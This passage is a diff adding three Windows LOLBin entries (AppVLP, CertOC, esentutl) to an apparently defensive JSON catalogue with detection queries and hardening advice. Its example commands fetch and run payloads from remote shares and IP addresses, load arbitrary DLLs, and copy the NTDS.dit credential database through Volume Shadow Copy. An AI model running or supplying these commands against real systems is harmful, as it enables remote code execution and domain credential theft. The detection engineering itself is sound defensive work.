+        {"command": "appvlp.exe \\\\198.51.100.40\\share\\payload.bat", "purpose": "Executes a batch file hosted on a remote WebDAV/SMB share through AppVLP.exe"},
+        {"command": "appvlp.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('payload.exe','','','open',1)\"", "purpose": "Spawns PowerShell as a child of AppVLP.exe to launch a payload, exploiting Office ASR rule exclusions that trust AppVLP.exe"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"appvlp.exe\"\n| where ProcessCommandLine has_any (\"powershell\", \"\\\\\\\\\", \".bat\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Suspicious Appvlp Child Process or Remote Fetch\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\appvlp.exe'\n  susp_child:\n    ParentImage|endswith: '\\appvlp.exe'\n    CommandLine|contains:\n      - 'powershell'\n      - 'cmd.exe'\n  condition: selection and susp_child\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter causality_actor_process_image_name = \"appvlp.exe\"\n| fields agent_hostname, actor_effective_username, action_process_image_name, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Legitimate App-V sequenced application launches on Office 2016+ deployments using App-V (rare in most modern estates)"
+      ],
+      "defence_guidance": [
+        "AppVLP.exe has no legitimate use on estates that do not deploy App-V sequenced Office applications; block via WDAC where confirmed unused",
+        "Alert on appvlp.exe spawning powershell.exe, cmd.exe, or any script host as a child process",
+        "Review Office ASR rule exclusions that whitelist appvlp.exe, since they are a known evasion path"
+      ],
+      "related_lolbins": ["mshta", "wscript"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OtherMSBinaries/Appvlp.yml",
+        "https://attack.mitre.org/techniques/T1218/"
+      ]
+    },
+    {
+      "id": "certoc",
+      "name": "CertOC.exe",
+      "path": "C:\\Windows\\System32\\certoc.exe",
+      "category": "Execute",
+      "description": "Certificate enrollment/CA-capabilities utility bundled with Windows. It is LOLBAS-relevant because its -LoadDLL switch will load and execute an arbitrary DLL, and its -GetCACAPS switch can fetch a remote text-formatted file such as a script.",
+      "legitimate_use": "Used to query CA capabilities and manage certificate enrollment operations, typically by PKI administrators.",
+      "attack_techniques": [
+        {"id": "T1218", "name": "System Binary Proxy Execution"},
+        {"id": "T1105", "name": "Ingress Tool Transfer"}
+      ],
+      "example_commands": [
+        {"command": "certoc.exe -LoadDLL payload.dll", "purpose": "Loads and executes an attacker-supplied DLL via certoc's certificate-provider DLL loader"},
+        {"command": "certoc.exe -GetCACAPS http://203.0.113.140/payload.ps1", "purpose": "Downloads a remote text-formatted file such as a script using certoc's CA-capabilities query"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"certoc.exe\"\n| where ProcessCommandLine has_any (\"-LoadDLL\", \"-GetCACAPS\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Certoc Suspicious DLL Load or Remote Fetch\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\certoc.exe'\n    CommandLine|contains:\n      - '-LoadDLL'\n      - '-GetCACAPS'\n  condition: selection\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"certoc.exe\"\n| filter action_process_image_command_line contains \"-LoadDLL\" or action_process_image_command_line contains \"-GetCACAPS\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "PKI administrator tooling querying CA capabilities or managing certificate enrollment"
+      ],
+      "defence_guidance": [
+        "Certoc.exe -LoadDLL is rarely used outside PKI administration; alert on any invocation loading a DLL from a user-writable path",
+        "Alert on certoc.exe making outbound network connections, since routine CA-capability queries are internal to the enterprise PKI"
+      ],
+      "related_lolbins": ["certutil", "register-cimprovider"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Certoc.yml",
+        "https://attack.mitre.org/techniques/T1218/",
+        "https://attack.mitre.org/techniques/T1105/"
+      ]
+    },
+    {
+      "id": "esentutl",
+      "name": "esentutl.exe",
+      "path": "C:\\Windows\\System32\\esentutl.exe",
+      "category": "Download",
+      "description": "Utility for managing and repairing Microsoft's Extensible Storage Engine (JET/ESE) databases, which also exposes a general-purpose file-copy switch. It is LOLBAS-relevant because its /y /d copy mode can transfer files between local, UNC, and Alternate-Data-Stream paths, and can copy a locked file -- including the NTDS.dit Active Directory database -- via Volume Shadow Copy.",
+      "legitimate_use": "Used by administrators to check, repair, and defragment ESE-based databases such as Active Directory's NTDS.dit and the Windows Search index.",
+      "attack_techniques": [
+        {"id": "T1105", "name": "Ingress Tool Transfer"},
+        {"id": "T1003.003", "name": "OS Credential Dumping: NTDS"}
+      ],
+      "example_commands": [
+        {"command": "esentutl.exe /y \\\\198.51.100.50\\share\\payload.exe /d payload.exe /o", "purpose": "Copies a remote file from a UNC share to local disk using esentutl's file-copy mode"},
+        {"command": "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d ntds.dit.bak /o", "purpose": "Copies the normally-locked NTDS.dit Active Directory database via Volume Shadow Copy for offline credential extraction"}
+      ],
+      "detection_queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"esentutl.exe\"\n| where ProcessCommandLine has \"/y\" and ProcessCommandLine has \"/d\"\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Esentutl File Copy or NTDS.dit VSS Extraction\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_copy:\n    Image|endswith: '\\esentutl.exe'\n    CommandLine|contains:\n      - '/y '\n      - '/d '\n  selection_ntds:\n    CommandLine|contains: 'ntds.dit'\n  condition: selection_copy or selection_ntds\nlevel: high",
+        "xql": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter action_process_image_name = \"esentutl.exe\"\n| filter action_process_image_command_line contains \"/y\" or action_process_image_command_line contains \"ntds.dit\"\n| fields agent_hostname, actor_effective_username, action_process_image_command_line"
+      },
+      "false_positives": [
+        "Scheduled ESE database maintenance (defrag/repair) on Domain Controllers or Windows Search index hosts",
+        "Legitimate backup tooling copying files via esentutl's /y /d switches"
+      ],
+      "defence_guidance": [
+        "Alert on esentutl.exe invoked with /y and a source path outside known ESE database maintenance workflows",
+        "Treat esentutl.exe /vss targeting ntds.dit as a critical Domain Controller credential-theft indicator",
+        "Restrict esentutl.exe execution on non-Domain-Controller, non-database-server endpoints via WDAC"
+      ],
+      "related_lolbins": ["diskshadow", "certoc"],
+      "sources": [
+        "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/yml/OSBinaries/Esentutl.yml",
+        "https://attack.mitre.org/techniques/T1105/",
+        "https://attack.mitre.org/techniques/T1003/003/"
       ]
     }
   ]
